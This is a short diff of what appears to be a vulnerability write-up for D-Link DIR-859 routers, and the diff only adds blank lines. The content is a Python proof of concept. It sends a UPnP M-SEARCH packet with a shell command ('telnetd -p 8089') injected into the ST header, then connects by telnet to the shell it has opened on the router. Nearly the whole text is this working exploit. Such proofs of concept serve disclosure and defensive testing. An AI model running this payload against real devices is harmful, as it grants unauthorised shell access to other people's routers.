@@ -9,16 +9,23 @@ An issue was discovered on D-Link DIR-859 devices. Universal Plug and Play (UPnP
 
 # poc
 from socket import *
+
 from os import *
+
 from time import *
  
 payload = b'M-SEARCH * HTTP/1.1\r\n'
+
 payload += b'HOST:localhost:1900\r\n'
+
 payload += b'ST:urn:device:;telnetd -p 8089\r\n\r\n'
  
 s = socket(AF_INET, SOCK_DGRAM, 0)
+
 s.sendto(payload, ("192.168.0.1", 1900))
+
 s.close()
  
 sleep(1)
+
 system("telnet 192.168.0.1 8089")
